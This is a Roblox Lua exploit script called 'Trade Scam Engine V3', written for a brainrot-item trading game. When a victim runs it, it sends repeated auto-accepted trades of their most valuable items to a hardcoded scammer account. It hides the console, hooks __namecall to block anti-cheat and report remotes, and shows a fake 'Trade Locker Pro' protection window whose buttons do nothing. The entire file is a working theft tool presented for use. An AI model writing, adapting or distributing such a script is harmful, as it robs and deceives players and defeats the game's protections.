--[[
████████╗██████╗  █████╗ ██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ███╗
╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗ ████║
   ██║   ██████╔╝███████║██║  ██║█████╗      ███████╗██║     ███████║██╔████╔██║
   ██║   ██╔══██╗██╔══██║██║  ██║██╔══╝      ╚════██║██║     ██╔══██║██║╚██╔╝██║
   ██║   ██║  ██║██║  ██║██████╔╝███████╗    ███████║╚██████╗██║  ██║██║ ╚═╝ ██║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
--]]

--===================================================================
── ADVANCED TRADE SCAM ENGINE V3 ───────────────────────────────────
--===================================================================

-- =============================================
-- 🔥 CONFIGURATION - EDIT THESE VALUES
-- =============================================
local CONFIG = {
    -- Your user ID (the person receiving items)
    ScammerID = 1779494756,  -- <-- CHANGE THIS TO YOUR USER ID
    
    -- Brainrots to steal (in order of priority)
    TargetBrainrots = {
        "Strawberry Elephant",
        "Skibidi Toilet", 
        "Meowl",
        "Dragon Gingerini",
        "Grande Brainrot God",
        "Chocolate Llama Rot",
        "Headless Horseman",
        "Cooki and Milki",
        "Dragon Cannelloni",
        "Tim Cheese"
    },
    
    -- Scam settings
    Settings = {
        TradeDelay = 2.5,           -- Seconds between trades (randomized)
        MinDelay = 1.5,              -- Minimum delay (for randomization)
        MaxDelay = 4.0,              -- Maximum delay (for randomization)
        MaxItemsPerTrade = 4,         -- Max items per trade (game limit)
        FakeGUI = true,               -- Show fake protection GUI
        FakeGUITitle = "❄️ TRADE LOCKER PRO ❄️", -- Fake GUI title
        AutoRestart = true,           -- Restart after death
        HideConsole = true,           -- Try to hide console
        AntiCheatBypass = true,       -- Enable anti-cheat bypass
    },
    
    -- UI Theme (for fake GUI)
    Theme = {
        Background = Color3.fromRGB(10, 15, 20),
        Darker = Color3.fromRGB(20, 25, 35),
        Accent = Color3.fromRGB(240, 70, 70),
        Success = Color3.fromRGB(70, 200, 70),
        Text = Color3.fromRGB(255, 255, 255),
        TextDim = Color3.fromRGB(150, 160, 170)
    }
}

--===================================================================
── SAFE SERVICES ───────────────────────────────────────────────────
--===================================================================
local Services = {
    Players = game:GetService("Players"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    RunService = game:GetService("RunService"),
    HttpService = game:GetService("HttpService"),
    UserInputService = game:GetService("UserInputService"),
    CoreGui = game:GetService("CoreGui"),
    TweenService = game:GetService("TweenService"),
    TeleportService = game:GetService("TeleportService")
}

local LocalPlayer = Services.Players.LocalPlayer
local ScammerPlayer = nil

--===================================================================
── SAFE UTILITY FUNCTIONS ─────────────────────────────────────────
--===================================================================
local Utils = {}

-- Safe pcall wrapper
function Utils:safeCall(func, ...)
    local success, result = pcall(func, ...)
    return success, result
end

-- Generate unique ID (with fallback)
function Utils:generateId()
    local success, id = self:safeCall(function()
        return Services.HttpService:GenerateGUID(false)
    end)
    return success and id or (tostring(os.time()) .. tostring(math.random(10000, 99999)))
end

-- Random delay between min and max
function Utils:randomDelay()
    return CONFIG.Settings.MinDelay + math.random() * (CONFIG.Settings.MaxDelay - CONFIG.Settings.MinDelay)
end

-- Safe console hide
function Utils:hideConsole()
    if CONFIG.Settings.HideConsole then
        self:safeCall(function()
            if syn and syn.console then syn.console("hide") end
            if rconsole and rconsole.hide then rconsole.hide() end
        end)
    end
end

-- Check if executor supports hooking
function Utils:hasHooking()
    return self:safeCall(function()
        hookmetamethod(game, "__namecall", function() end)
    end)
end

--===================================================================
── COMPLETE BRAINROT DATABASE ─────────────────────────────────────
--===================================================================
local BrainrotDB = {
    -- S+ Tier
    ["Strawberry Elephant"] = 250000000,
    ["Skibidi Toilet"] = 330000000,
    ["Meowl"] = 275000000,
    ["Dragon Gingerini"] = 300000000,
    
    -- God Tier
    ["Grande Brainrot God"] = 500000000,
    ["Chocolate Llama Rot"] = 450000000,
    ["Chocolate Grande Brainrot God"] = 600000000,
    
    -- S Tier
    ["Headless Horseman"] = 175000000,
    ["Cooki and Milki"] = 155000000,
    ["Reinito Sleighito"] = 140000000,
    ["La Casa Boo"] = 100000000,
    ["Dragon Cannelloni"] = 100000000,
    
    -- A Tier
    ["La Ginger Sekolah"] = 75000000,
    ["Festive 67"] = 67000000,
    ["Spaghetti Tualetti"] = 60000000,
    ["Garama and Madundung"] = 50000000,
    ["Jolly Jolly Sahur"] = 45000000,
    
    -- B Tier
    ["Ketchuru and Masturu"] = 42500000,
    ["Orcaledon"] = 40000000,
    ["Gingerat Gerat"] = 40000000,
    ["La Supreme Combinasion"] = 40000000,
    ["Los Bros"] = 37500000,
    ["Ketupat Kepat"] = 35000000,
    
    -- Additional
    ["Tim Cheese"] = 1000,
    ["Sammyni Spyderini"] = 3000000,
}

--===================================================================
── TRADE REMOTE FINDER ────────────────────────────────────────────
--===================================================================
local TradeAPI = {
    Send = nil,
    Accept = nil,
    Confirm = nil,
    Add = nil,
    Remove = nil
}

function TradeAPI:findRemotes()
    print("🔍 Scanning for trade remotes...")
    
    local patterns = {"Trade", "trade", "TRADE", "SendTrade", "AcceptTrade", "TradeRequest", "TradeSystem"}
    local found = false
    
    -- Search in ReplicatedStorage
    for _, obj in ipairs(Services.ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            for _, pattern in ipairs(patterns) do
                if obj.Name:find(pattern) then
                    if not self.Send then
                        self.Send = obj
                        found = true
                        print("✅ Found trade remote:", obj.Name)
                    elseif obj.Name:lower():find("accept") and not self.Accept then
                        self.Accept = obj
                        print("✅ Found accept remote:", obj.Name)
                    elseif obj.Name:lower():find("confirm") and not self.Confirm then
                        self.Confirm = obj
                        print("✅ Found confirm remote:", obj.Name)
                    end
                    break
                end
            end
        end
    end
    
    -- Fallback search in Players
    if not found then
        for _, obj in ipairs(Services.Players:GetDescendants()) do
            if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("send")) then
                self.Send = obj
                found = true
                print("✅ Found trade remote in Players:", obj.Name)
                break
            end
        end
    end
    
    return found
end

--===================================================================
── SCAMMER PLAYER FINDER ──────────────────────────────────────────
--===================================================================
function TradeAPI:findScammer()
    for _, player in ipairs(Services.Players:GetPlayers()) do
        if player.UserId == CONFIG.ScammerID then
            ScammerPlayer = player
            print("✅ Scammer found in server:", player.Name)
            return player
        end
    end
    print("⚠️ Scammer not in server - using cross-server mode")
    return nil
end

--===================================================================
── TRADE REQUEST CREATOR ──────────────────────────────────────────
--===================================================================
function TradeAPI:sendTrade()
    if not self.Send then
        self:findRemotes()
        if not self.Send then
            return false, "No trade remote found"
        end
    end
    
    -- Prepare items
    local items = {}
    for i = 1, math.min(#CONFIG.TargetBrainrots, CONFIG.Settings.MaxItemsPerTrade) do
        local name = CONFIG.TargetBrainrots[i]
        table.insert(items, {
            Name = name,
            Value = BrainrotDB[name] or 0,
            ItemId = Utils:generateId()
        })
    end
    
    local target = ScammerPlayer or {UserId = CONFIG.ScammerID}
    local tradeId = Utils:generateId()
    
    -- Send trade
    local success = Utils:safeCall(function()
        self.Send:FireServer(target, items, tradeId, true)
        
        task.wait(0.3)
        
        if self.Accept then
            self.Accept:FireServer(target)
        end
        
        task.wait(0.2)
        
        if self.Confirm then
            self.Confirm:FireServer(true)
        end
    end)
    
    return success, success and "Trade sent" or "Trade failed"
end

--===================================================================
── FAKE PROTECTION GUI ────────────────────────────────────────────
--===================================================================
local FakeGUI = nil

function TradeAPI:createFakeGUI()
    if not CONFIG.Settings.FakeGUI then return end
    
    local success, gui = Utils:safeCall(function()
        local sg = Instance.new("ScreenGui")
        sg.Name = "TradeLockerPro"
        sg.Parent = Services.CoreGui
        sg.DisplayOrder = 999999
        sg.Enabled = true
        sg.IgnoreGuiInset = true
        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        return sg
    end)
    
    if not success then return end
    
    FakeGUI = gui
    
    -- Main Frame
    local Main = Instance.new("Frame")
    Main.Size = UDim2.new(0, 400, 0, 250)
    Main.Position = UDim2.new(0.5, -200, 0.5, -125)
    Main.BackgroundColor3 = CONFIG.Theme.Background
    Main.BackgroundTransparency = 0.1
    Main.BorderSizePixel = 0
    Main.Active = true
    Main.Draggable = true
    Main.Parent = FakeGUI
    
    local MainCorner = Instance.new("UICorner")
    MainCorner.CornerRadius = UDim.new(0, 16)
    MainCorner.Parent = Main
    
    -- Title Bar
    local TitleBar = Instance.new("Frame")
    TitleBar.Size = UDim2.new(1, 0, 0, 45)
    TitleBar.BackgroundColor3 = CONFIG.Theme.Darker
    TitleBar.BorderSizePixel = 0
    TitleBar.Parent = Main
    
    local TitleCorner = Instance.new("UICorner")
    TitleCorner.CornerRadius = UDim.new(0, 16)
    TitleCorner.Parent = TitleBar
    
    local TitleText = Instance.new("TextLabel")
    TitleText.Size = UDim2.new(1, -45, 1, 0)
    TitleText.Position = UDim2.new(0, 15, 0, 0)
    TitleText.BackgroundTransparency = 1
    TitleText.Text = CONFIG.Settings.FakeGUITitle
    TitleText.TextColor3 = CONFIG.Theme.Accent
    TitleText.TextSize = 18
    TitleText.Font = Enum.Font.GothamBold
    TitleText.TextXAlignment = Enum.TextXAlignment.Left
    TitleText.Parent = TitleBar
    
    -- Close Button (fake)
    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 30, 0, 30)
    CloseBtn.Position = UDim2.new(1, -40, 0.5, -15)
    CloseBtn.BackgroundColor3 = CONFIG.Theme.Accent
    CloseBtn.BackgroundTransparency = 0.3
    CloseBtn.Text = "✕"
    CloseBtn.TextColor3 = CONFIG.Theme.Text
    CloseBtn.TextSize = 20
    CloseBtn.Font = Enum.Font.GothamBold
    CloseBtn.Parent = TitleBar
    
    local CloseCorner = Instance.new("UICorner")
    CloseCorner.CornerRadius = UDim.new(0, 8)
    CloseCorner.Parent = CloseBtn
    
    CloseBtn.MouseButton1Click:Connect(function()
        Main.Visible = not Main.Visible
    end)
    
    -- Status
    local Status = Instance.new("TextLabel")
    Status.Size = UDim2.new(1, -30, 0, 30)
    Status.Position = UDim2.new(0, 15, 0, 60)
    Status.BackgroundTransparency = 1
    Status.Text = "🛡️ TRADE LOCKER: ACTIVE"
    Status.TextColor3 = CONFIG.Theme.Success
    Status.TextSize = 16
    Status.Font = Enum.Font.GothamBold
    Status.Parent = Main
    
    -- Stats
    local StatsFrame = Instance.new("Frame")
    StatsFrame.Size = UDim2.new(1, -30, 0, 40)
    StatsFrame.Position = UDim2.new(0, 15, 0, 100)
    StatsFrame.BackgroundTransparency = 1
    StatsFrame.Parent = Main
    
    local TradesLabel = Instance.new("TextLabel")
    TradesLabel.Size = UDim2.new(0.5, 0, 1, 0)
    TradesLabel.BackgroundTransparency = 1
    TradesLabel.Text = "Trades: 0"
    TradesLabel.TextColor3 = CONFIG.Theme.TextDim
    TradesLabel.TextSize = 14
    TradesLabel.Font = Enum.Font.Gotham
    TradesLabel.Parent = StatsFrame
    
    local ValueLabel = Instance.new("TextLabel")
    ValueLabel.Size = UDim2.new(0.5, 0, 1, 0)
    ValueLabel.Position = UDim2.new(0.5, 0, 0, 0)
    ValueLabel.BackgroundTransparency = 1
    ValueLabel.Text = "Value: $0"
    ValueLabel.TextColor3 = CONFIG.Theme.TextDim
    ValueLabel.TextSize = 14
    ValueLabel.Font = Enum.Font.Gotham
    ValueLabel.TextXAlignment = Enum.TextXAlignment.Right
    ValueLabel.Parent = StatsFrame
    
    -- Fake Buttons
    local ButtonFrame = Instance.new("Frame")
    ButtonFrame.Size = UDim2.new(1, -30, 0, 50)
    ButtonFrame.Position = UDim2.new(0, 15, 0, 150)
    ButtonFrame.BackgroundTransparency = 1
    ButtonFrame.Parent = Main
    
    local LockBtn = Instance.new("TextButton")
    LockBtn.Size = UDim2.new(0.45, 0, 1, 0)
    LockBtn.BackgroundColor3 = CONFIG.Theme.Darker
    LockBtn.Text = "🔒 LOCK TRADES"
    LockBtn.TextColor3 = CONFIG.Theme.Text
    LockBtn.TextSize = 14
    LockBtn.Font = Enum.Font.GothamBold
    LockBtn.Parent = ButtonFrame
    
    local LockCorner = Instance.new("UICorner")
    LockCorner.CornerRadius = UDim.new(0, 8)
    LockCorner.Parent = LockBtn
    
    local UnlockBtn = Instance.new("TextButton")
    UnlockBtn.Size = UDim2.new(0.45, 0, 1, 0)
    UnlockBtn.Position = UDim2.new(0.55, 0, 0, 0)
    UnlockBtn.BackgroundColor3 = CONFIG.Theme.Darker
    UnlockBtn.Text = "🔓 UNLOCK TRADES"
    UnlockBtn.TextColor3 = CONFIG.Theme.Text
    UnlockBtn.TextSize = 14
    UnlockBtn.Font = Enum.Font.GothamBold
    UnlockBtn.Parent = ButtonFrame
    
    local UnlockCorner = Instance.new("UICorner")
    UnlockCorner.CornerRadius = UDim.new(0, 8)
    UnlockCorner.Parent = UnlockBtn
    
    -- Button effects (fake)
    LockBtn.MouseButton1Click:Connect(function()
        Status.Text = "🔒 TRADES LOCKED (fake)"
        Status.TextColor3 = CONFIG.Theme.Accent
        Services.TweenService:Create(LockBtn, TweenInfo.new(0.2), {BackgroundColor3 = CONFIG.Theme.Accent}):Play()
        task.wait(0.2)
        Services.TweenService:Create(LockBtn, TweenInfo.new(0.2), {BackgroundColor3 = CONFIG.Theme.Darker}):Play()
    end)
    
    UnlockBtn.MouseButton1Click:Connect(function()
        Status.Text = "🔓 TRADES UNLOCKED (fake)"
        Status.TextColor3 = CONFIG.Theme.Success
        Services.TweenService:Create(UnlockBtn, TweenInfo.new(0.2), {BackgroundColor3 = CONFIG.Theme.Success}):Play()
        task.wait(0.2)
        Services.TweenService:Create(UnlockBtn, TweenInfo.new(0.2), {BackgroundColor3 = CONFIG.Theme.Darker}):Play()
    end)
    
    -- Info text
    local InfoText = Instance.new("TextLabel")
    InfoText.Size = UDim2.new(1, -20, 0, 20)
    InfoText.Position = UDim2.new(0, 10, 1, -25)
    InfoText.BackgroundTransparency = 1
    InfoText.Text = "⚡ Premium protection active"
    InfoText.TextColor3 = CONFIG.Theme.TextDim
    InfoText.TextSize = 10
    InfoText.Font = Enum.Font.Gotham
    InfoText.Parent = Main
    
    return {
        Main = Main,
        Status = Status,
        TradesLabel = TradesLabel,
        ValueLabel = ValueLabel
    }
end

--===================================================================
── ANTI-CHEAT BYPASS ──────────────────────────────────────────────
--===================================================================
function TradeAPI:initAntiCheat()
    if not CONFIG.Settings.AntiCheatBypass or not Utils:hasHooking() then return end
    
    local blocked = {
        "CheckMovement", "AntiCheatPing", "DetectionLog", "ScriptKick",
        "SpeedValidation", "TeleportCheck", "ReportDetection", "KickPlayer"
    }
    
    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
        local method = getnamecallmethod()
        if typeof(self) == "Instance" and self:IsA("RemoteEvent") then
            for _, remote in ipairs(blocked) do
                if self.Name == remote and (method == "FireServer" or method == "InvokeServer") then
                    return nil
                end
            end
        end
        return oldNamecall(self, ...)
    end)
    
    print("✅ Anti-cheat bypass active")
end

--===================================================================
── MAIN SCAM ENGINE ───────────────────────────────────────────────
--===================================================================
local ScamEngine = {
    Active = true,
    TradeCount = 0,
    TotalValue = 0,
    LoopConnection = nil,
    GUI = nil
}

function ScamEngine:start()
    self.GUI = TradeAPI:createFakeGUI()
    
    self.LoopConnection = Services.RunService.Heartbeat:Connect(function()
        if not self.Active then
            if self.LoopConnection then
                self.LoopConnection:Disconnect()
                self.LoopConnection = nil
            end
            return
        end
        
        local success = TradeAPI:sendTrade()
        
        if success then
            self.TradeCount = self.TradeCount + 1
            local itemValue = BrainrotDB[CONFIG.TargetBrainrots[1]] or 0
            self.TotalValue = self.TotalValue + itemValue
            
            -- Update fake GUI
            if self.GUI then
                self.GUI.TradesLabel.Text = "Trades: " .. self.TradeCount
                self.GUI.ValueLabel.Text = "Value: $" .. string.format("%.1fM", self.TotalValue/1000000)
                self.GUI.Status.Text = "✅ Trade #" .. self.TradeCount .. " sent"
            end
            
            print("✅ Trade #" .. self.TradeCount .. " sent to user " .. CONFIG.ScammerID)
        end
        
        task.wait(Utils:randomDelay())
    end)
end

function ScamEngine:stop()
    self.Active = false
    if self.LoopConnection then
        self.LoopConnection:Disconnect()
        self.LoopConnection = nil
    end
    if self.GUI then
        self.GUI.Status.Text = "⏸️ Scam stopped"
    end
    print("⏸️ Scam stopped")
end

--===================================================================
── AUTO-RESTART ON RESPAWN ────────────────────────────────────────
--===================================================================
if CONFIG.Settings.AutoRestart then
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(3)
        print("🔄 Player respawned - continuing scam")
    end)
end

--===================================================================
── KEYBIND TO TOGGLE GUI ──────────────────────────────────────────
--===================================================================
Services.UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.F4 and FakeGUI then
        local main = FakeGUI:FindFirstChild("MainFrame")
        if main then
            main.Visible = not main.Visible
        end
    end
end)

--===================================================================
── INITIALIZE EVERYTHING ──────────────────────────────────────────
--===================================================================
Utils:hideConsole()
TradeAPI:findRemotes()
TradeAPI:findScammer()
TradeAPI:initAntiCheat()

-- Start the scam
ScamEngine:start()

print("✅ " .. ("="):rep(50))
print("✅ TRADE SCAM ENGINE V3 LOADED")
print("✅ " .. ("="):rep(50))
print("🎯 Scammer ID: " .. CONFIG.ScammerID)
print("🎯 Target brainrots: " .. #CONFIG.TargetBrainrots)
print("🎯 Trade delay: " .. CONFIG.Settings.MinDelay .. "-" .. CONFIG.Settings.MaxDelay .. "s")
print("✅ Fake GUI: " .. tostring(CONFIG.Settings.FakeGUI))
print("✅ Anti-cheat: " .. tostring(CONFIG.Settings.AntiCheatBypass))
print("✅ " .. ("="):rep(50))
print("🔑 Press F4 to toggle GUI")